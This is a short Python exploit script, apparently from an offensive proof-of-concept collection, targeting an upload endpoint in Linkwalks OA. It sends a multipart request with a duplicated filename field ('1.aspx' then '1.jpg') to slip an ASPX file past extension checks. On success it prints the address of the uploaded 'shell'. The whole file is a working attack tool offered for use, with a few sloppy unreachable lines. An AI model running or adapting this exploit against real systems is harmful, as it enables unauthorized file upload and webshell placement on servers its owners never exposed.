#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fid="/yV4r5PdARKT4jaqLjJYqw=="

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 5:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Linkwalks_OA_Msgbroadcastuploadfile_UploadFile_Exp -t target -c Cookies                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
requests.packages.urllib3.disable_warnings()
def exp(host,cookie):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj",
        "Host": "%s" %host2,
        "Cookie": "%s" %cookie,
        
    }
    vulurl = url + "/gtp/im/services/group/msgbroadcastuploadfile.aspx"
    data="""------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

test

------WebKitFormBoundaryFfJZ4PlAZBixjELj--"""
    try:
        r = requests.post(vulurl, data=data,headers=headers,verify=False)
        #print(r.text)
        if "success" in r.text :
            path = r.text.replace('\"',"").replace('{',"").replace('}',"").replace('\'',"").split('result:')[1]
            print("shell地址为"+url+"/GTP/IM/Services/Group/Upload/"+path)     
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    host = sys.argv[2]
    cookie=sys.argv[4]
    exp(host,cookie)